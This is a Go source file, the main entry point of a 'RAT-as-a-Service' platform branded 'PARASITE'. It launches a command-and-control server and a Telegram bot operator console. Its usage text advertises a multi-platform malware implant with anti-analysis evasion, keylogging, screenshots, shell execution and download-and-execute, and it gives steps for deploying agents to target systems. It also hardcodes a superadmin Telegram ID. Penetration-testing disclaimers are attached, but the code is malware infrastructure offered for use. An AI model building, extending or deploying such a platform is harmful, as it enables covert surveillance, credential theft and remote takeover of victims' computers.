package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	c2server "rat-as-a-service/c2-server"
	"rat-as-a-service/config"
	telegrambot "rat-as-a-service/telegram-bot"
)

func printBanner() {
	// ANSI color codes for scary purple/pink
	magenta := "\033[35m" // Magenta/Purple
	purple := "\033[95m"  // Light purple/pink
	reset := "\033[0m"

	banner := `
` + magenta + `███████████████████████████████████████████████████████████████████` + reset + `
` + magenta + `█` + reset + `                                                                 ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `██████╗  █████╗ ██████╗  █████╗ ███████╗██╗████████╗███████╗` + reset + `  ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██║╚══██╔══╝██╔════╝` + reset + `  ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `██████╔╝███████║██████╔╝███████║███████╗██║   ██║   █████╗` + reset + `    ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `██╔═══╝ ██╔══██║██╔══██╗██╔══██║╚════██║██║   ██║   ██╔══╝` + reset + `    ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `██║     ██║  ██║██║  ██║██║  ██║███████║██║   ██║   ███████╗` + reset + `  ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `  ` + purple + `╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚══════╝` + reset + `  ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `                                                                 ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `         ` + purple + `☠️  Professional Remote Administration Tool ☠️` + reset + `          ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `              ` + purple + `Penetration Testing & Security Research` + reset + `           ` + magenta + `█` + reset + `
` + magenta + `█` + reset + `                                                                 ` + magenta + `█` + reset + `
` + magenta + `███████████████████████████████████████████████████████████████████` + reset + `

    ` + purple + `📱 Telegram Bot Controller` + reset + `   |   ` + purple + `🌐 C2 Communication Server` + reset + `
    ` + purple + `🤖 Multi-Platform Agents` + reset + `     |   ` + purple + `📊 Real-time Management` + reset + `
    ` + purple + `🔐 Anti-Analysis & Evasion` + reset + `   |   ` + purple + `⚡ Command & Control` + reset + `

    ` + magenta + `🚨 FOR AUTHORIZED PENETRATION TESTING ONLY 🚨` + reset

	fmt.Println(banner)
}

func printUsage() {
	fmt.Println(`
🔧 USAGE:

  Launch Full RAT-as-a-Service Platform:
    go run main.go

  Launch Individual Components:
    go run main.go -component c2          # C2 Server only
    go run main.go -component bot         # Telegram Bot only  
    go run main.go -component agent       # RAT Agent only

  Configuration:
    go run main.go -bot-token YOUR_TOKEN  # Set Telegram bot token
    go run main.go -c2-host 0.0.0.0       # Set C2 server host
    go run main.go -c2-port 8080          # Set C2 server port

📋 COMPONENTS:

  🌐 C2 Server:
    • Agent registration & management
    • Task distribution & result collection
    • RESTful API endpoints
    • Health monitoring

  📱 Telegram Bot:
    • Operator command interface
    • Real-time agent interaction
    • Task scheduling & monitoring
    • Superadmin authorization (ID: 7991166259)

  🤖 RAT Agent:
    • Multi-platform malware implant
    • Anti-analysis & sandbox detection
    • Shell command execution
    • Screenshot & keylogging capabilities
    • File download & execution
    • Encrypted C2 communication

🔑 TELEGRAM BOT SETUP:

  1. Create bot with @BotFather on Telegram
  2. Get bot token
  3. Replace BOT_TOKEN in telegram-bot/bot.go
  4. Start platform: go run main.go
  5. Message your bot from user ID 7991166259

📡 AGENT DEPLOYMENT:

  1. Build agent: go build -o agent.exe ./agent/
  2. Deploy to target systems
  3. Agent will auto-register with C2
  4. Control via Telegram bot

⚠️  LEGAL WARNING: Use only for authorized penetration testing
`)
}

type RATService struct {
	c2Server    *c2server.C2Server
	telegramBot *telegrambot.TelegramBot
	wg          sync.WaitGroup
}

func NewRATService() *RATService {
	return &RATService{}
}

func (r *RATService) startC2Server() error {
	log.Println("🌐 Starting C2 Server...")

	r.c2Server = c2server.NewC2Server()

	r.wg.Add(1)
	go func() {
		defer r.wg.Done()
		r.c2Server.StartHTTPServer()
	}()

	// Wait a moment for server to start
	time.Sleep(2 * time.Second)
	log.Printf("✅ C2 Server listening on %s:%s", config.C2_SERVER_HOST, config.C2_SERVER_PORT)
	return nil
}

func (r *RATService) startTelegramBot(botToken string) error {
	if botToken == "" {
		return fmt.Errorf("bot token is required")
	}

	log.Println("📱 Starting Telegram Bot...")

	var err error
	r.telegramBot, err = telegrambot.NewTelegramBot(botToken, r.c2Server)
	if err != nil {
		return fmt.Errorf("failed to create Telegram bot: %v", err)
	}

	r.wg.Add(1)
	go func() {
		defer r.wg.Done()
		r.telegramBot.Start()
	}()

	log.Printf("✅ Telegram Bot started (Superadmin: %d)", telegrambot.SUPERADMIN_ID)
	return nil
}

func (r *RATService) startFullPlatform(botToken string) error {
	log.Println("🚀 Launching RAT-as-a-Service Platform...")

	// Start C2 Server
	if err := r.startC2Server(); err != nil {
		return fmt.Errorf("failed to start C2 server: %v", err)
	}

	// Start Telegram Bot
	if err := r.startTelegramBot(botToken); err != nil {
		return fmt.Errorf("failed to start Telegram bot: %v", err)
	}

	log.Println("🎯 RAT Platform fully operational!")
	log.Println("")
	log.Println("📊 PLATFORM STATUS:")
	log.Printf("   🌐 C2 Server: http://%s:%s", config.C2_SERVER_HOST, config.C2_SERVER_PORT)
	log.Printf("   📱 Telegram Bot: Active (Superadmin: %d)", telegrambot.SUPERADMIN_ID)
	log.Printf("   🤖 Agent Endpoint: %s/register", config.C2_BASE_URL)
	log.Println("")
	log.Println("💡 NEXT STEPS:")
	log.Println("   1. Deploy RAT agents to target systems")
	log.Println("   2. Control agents via Telegram bot")
	log.Println("   3. Use /help command in Telegram for instructions")
	log.Println("")

	return nil
}

func (r *RATService) shutdown() {
	log.Println("🛑 Shutting down RAT Platform...")

	// Wait for all goroutines to finish
	r.wg.Wait()

	log.Println("✅ Platform shutdown complete")
}

func main() {
	// Command line flags
	var (
		component = flag.String("component", "full", "Component to run: full, c2, bot, agent")
		botToken  = flag.String("bot-token", "", "Telegram bot token")
		c2Host    = flag.String("c2-host", config.C2_SERVER_HOST, "C2 server host")
		c2Port    = flag.String("c2-port", config.C2_SERVER_PORT, "C2 server port")
		help      = flag.Bool("help", false, "Show help")
	)
	flag.Parse()

	// Configure logging
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// Show help
	if *help {
		printBanner()
		printUsage()
		return
	}

	// Print banner
	printBanner()

	// Update config if flags provided
	if *c2Host != config.C2_SERVER_HOST {
		// You'd update the config here in a real implementation
		log.Printf("C2 Host updated to: %s", *c2Host)
	}
	if *c2Port != config.C2_SERVER_PORT {
		// You'd update the config here in a real implementation
		log.Printf("C2 Port updated to: %s", *c2Port)
	}

	// Initialize service
	service := NewRATService()

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start requested component(s)
	var err error
	switch *component {
	case "full":
		if *botToken == "" {
			log.Println("❌ Bot token required for full platform")
			log.Println("   Set token with: -bot-token YOUR_TOKEN")
			log.Println("   Or edit BOT_TOKEN in telegram-bot/bot.go")
			return
		}
		err = service.startFullPlatform(*botToken)

	case "c2":
		err = service.startC2Server()

	case "bot":
		if *botToken == "" {
			log.Println("❌ Bot token required")
			return
		}
		// Need C2 server for bot to work
		err = service.startC2Server()
		if err == nil {
			err = service.startTelegramBot(*botToken)
		}

	case "agent":
		log.Println("🤖 To run RAT agent, use:")
		log.Println("   go run ./agent/agent.go [c2_url]")
		log.Printf("   Example: go run ./agent/agent.go %s", config.C2_BASE_URL)
		return

	default:
		log.Printf("❌ Unknown component: %s", *component)
		log.Println("   Valid options: full, c2, bot, agent")
		return
	}

	if err != nil {
		log.Fatalf("❌ Failed to start %s: %v", *component, err)
	}

	// Wait for shutdown signal
	<-sigChan
	log.Println("\n📡 Received shutdown signal...")

	// Graceful shutdown
	service.shutdown()
}
